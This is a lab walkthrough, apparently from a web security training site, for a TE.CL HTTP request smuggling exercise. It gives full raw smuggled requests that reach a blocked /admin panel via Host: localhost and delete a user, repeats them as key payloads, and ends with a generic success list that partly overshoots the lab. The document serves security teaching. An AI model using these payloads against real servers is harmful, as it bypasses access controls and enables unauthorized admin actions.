## Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

**Category:** request_smuggling
**Difficulty:** Unknown

### Description
This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at/admin, but the front-end server blocks access to it.

### Solution Steps
1. Try to visit /admin and observe that the request is blocked.
2. In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
3. Using Burp Repeater, issue the following request twice: POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

60
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0 Note You need to include the trailing sequence \r\n\r\n following the final 0 .
4. Observe that the merged request to /admin was rejected due to not using the header Host: localhost .
5. Issue the following request twice: POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
6. Observe that you can now access the admin panel.
7. Using the previous response as a reference, change the smuggled request URL to delete carlos : POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

### Key Payloads
- `/admin`
- `carlos`
- `POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

60
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0`
- `\r\n\r\n`
- `Host: localhost`
- `POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0`
- `POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0`

### Indicators of Success
- Request desync between front/back-end
- Subsequent request poisoned
- Other user's request captured
- Cache poisoned via smuggling
- Access controls bypassed
